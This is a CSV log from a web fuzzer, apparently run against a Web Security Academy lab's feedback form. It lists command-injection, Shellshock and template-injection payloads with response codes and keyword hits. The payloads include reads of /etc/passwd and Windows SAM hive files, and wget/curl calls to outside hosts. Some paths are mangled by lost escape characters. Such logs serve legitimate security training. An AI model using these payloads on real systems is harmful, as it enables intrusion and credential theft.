id_fuzz,#,Payload,URL,Method,StatusCode,SearchKeyword_error,SearchKeyword_exception,SearchKeyword_illegal,SearchKeyword_invalid,SearchKeyword_fail,SearchKeyword_stack,SearchKeyword_access,SearchKeyword_directory,SearchKeyword_file,SearchKeyword_not found,SearchKeyword_unknown,SearchKeyword_uid=,SearchKeyword_c:\,SearchKeyword_varchar,SearchKeyword_ODBC,SearchKeyword_SQL,SearchKeyword_quotation mark,SearchKeyword_syntax,SearchKeyword_ORA-,SearchKeyword_111111,SearchKeyword_test,SearchKeyword_test2,SearchKeyword_'||Utl_Http.request('http://<yourservername>') from dual--,TimeDelay,ContentLength
id_fuzz_1,349,system('pwd');,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,350,|| system('sleep 5');,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,351,| system('sleep 5');,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,352,; system('sleep 5');,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,353,& system('sleep 5');,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,354,&& system('sleep 5');,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,355,system('sleep 5'),https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,356,system('sleep 5');,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,357,system('wget https://crowdshield.com/.testing/rce_vuln.txt?req=22fd2w23'),https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,358,system('wget https://xerosecurity.com/.testing/rce_vuln.txt');,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,359,system('whoami'),https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,360,system('whoami');,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,361,test*; ls -lhtR /var/www/,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,362,"test* || perl -e 'print ""X""x16096'",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,363,"test* | perl -e 'print ""X""x16096'",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,364,"test* & perl -e 'print ""X""x16096'",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,365,"test* && perl -e 'print ""X""x16096'",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,366,"test*; perl -e 'print ""X""x16096'",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,367,$(`type C:oot.ini`),https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,368,&&type C:\boot.ini,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,369,"| type C:\Windowsepair\SAM",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,370,"; type C:\Windowsepair\SAM",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,371,"& type C:\Windowsepair\SAM",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,372,"&& type C:\Windowsepair\SAM",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,373,"type C:\Windowsepair\SAM",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,374,"| type C:\Windowsepair\SYSTEM",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,375,"; type C:\Windowsepair\SYSTEM",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,376,"& type C:\Windowsepair\SYSTEM",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,377,"&& type C:\Windowsepair\SYSTEM",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,378,"type C:\Windowsepair\SYSTEM",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,379,"| type C:\WINNTepair\SAM",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,380,"; type C:\WINNTepair\SAM",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,381,"& type C:\WINNTepair\SAM",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,382,"&& type C:\WINNTepair\SAM",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,383,"type C:\WINNTepair\SAM",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,384,"type C:\WINNTepair\SYSTEM",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,385,"| type %SYSTEMROOT%epair\SAM",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,386,"; type %SYSTEMROOT%epair\SAM",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,387,"& type %SYSTEMROOT%epair\SAM",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,388,"&& type %SYSTEMROOT%epair\SAM",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,389,"type %SYSTEMROOT%epair\SAM",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,390,"| type %SYSTEMROOT%epair\SYSTEM",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,391,"; type %SYSTEMROOT%epair\SYSTEM",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,392,"& type %SYSTEMROOT%epair\SYSTEM",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,393,"&& type %SYSTEMROOT%epair\SYSTEM",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,394,"type %SYSTEMROOT%epair\SYSTEM",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,395,uname,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,396,;uname;,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,397,| uname -a,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,398,; uname -a,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,399,& uname -a,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,400,&& uname -a,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,401,uname -a,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,402,|/usr/bin/id,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,403,;|/usr/bin/id|,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,404,;/usr/bin/id|,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,405,$;/usr/bin/id,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,406,"() { :;};/usr/bin/perl -e 'print ""Content-Type: text/plain\r\n\r\nXSUCCESS!"";system(""wget http://135.23.158.130/.testing/shellshock.txt?vuln=13;curl http://135.23.158.130/.testing/shellshock.txt?vuln=15;"");'",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,407,() { :;}; wget http://135.23.158.130/.testing/shellshock.txt?vuln=11,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,408,| wget http://crowdshield.com/.testing/rce.txt,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,409,& wget http://crowdshield.com/.testing/rce.txt,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,410,; wget https://crowdshield.com/.testing/rce_vuln.txt,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,411,$(`wget https://crowdshield.com/.testing/rce_vuln.txt`),https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,412,&& wget https://crowdshield.com/.testing/rce_vuln.txt,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,413,wget https://crowdshield.com/.testing/rce_vuln.txt,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,414,$(`wget https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`),https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,415,which curl,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,416,which gcc,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,417,which nc,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,418,which netcat,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,419,which perl,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,420,which python,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,421,which wget,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,422,whoami,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,423,| whoami,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,424,; whoami,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,425,' whoami,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,426,' || whoami,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,427,' & whoami,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,428,' && whoami,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,429,'; whoami,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,430,""" whoami",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,431,""" || whoami",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,432,""" | whoami",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,433,""" & whoami",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,434,""" && whoami",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,435,"""; whoami",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,436,$(`whoami`),https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,437,& whoami,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,438,&& whoami,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,439,"{{ get_user_file(""C:oot.ini"") }}",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,440,"{{ get_user_file(""/etc/hosts"") }}",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,441,"{{ get_user_file(""/etc/passwd"") }}",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,442,{{4+4}},https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,443,{{4+8}},https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,444,{{person.secret}},https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,445,{{person.name}},https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,446,{1} + {1},https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,447,"{% For c in [1,2,3]%} {{c, c, c}} {% endfor%}",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,448,{{[] .__ Class __.__ base __.__ subclasses __ ()}},https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
